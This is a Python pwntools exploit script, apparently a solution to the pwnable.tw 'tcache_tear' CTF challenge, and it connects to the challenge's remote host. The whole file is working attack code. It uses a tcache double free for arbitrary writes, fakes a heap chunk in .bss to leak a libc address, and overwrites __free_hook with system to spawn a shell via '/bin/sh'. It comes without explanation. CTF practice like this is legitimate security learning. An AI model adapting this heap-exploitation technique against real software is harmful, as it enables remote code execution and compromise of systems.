from pwn import *

elf = ELF("tcache_tear")
libc = ELF("libc-2.27.so")
bss = 0x602060
offset = 0x50
banner = "Your choice :"
# r=elf.process(env={'LD_PRELOAD':libc.path})
r = remote("chall.pwnable.tw", 10207)


# input("attach")

def init(name):
    r.recvuntil("Name:")
    r.sendline(name)


def free():
    r.recvuntil(banner)
    r.sendline("2")


def malloc(size, data):
    r.recvuntil(banner)
    r.sendline("1")
    r.recvuntil("Size:")
    r.sendline(str(size))
    r.recvuntil("Data:")
    r.sendline(data)


def info():
    r.recvuntil(banner)
    r.sendline("3")


def write(size, address, data):
    malloc(size, 'AAAA')
    free()
    free()
    malloc(size, p64(address))
    malloc(size, 'AAA')
    malloc(size, data)


init(p64(0) + p64(0x501))

write(0x50, bss + 0x500, (p64(0) + p64(0x21) + p64(0) * 2) * 2)
write(0x60, bss + 0x10, 'A')
free()
info()
r.recvuntil("Name :")
r.recv(0x10)
leak = u64(r.recv(8))
print(hex(leak))
libc_base = leak - 0x3ebca0
print(hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
print(hex(free_hook))
system = libc_base + libc.sym['system']
oneshot = libc_base + 0x4f322
write(0x70, free_hook, p64(system))
malloc(0x80, "/bin/sh\x00")
free()
r.interactive()
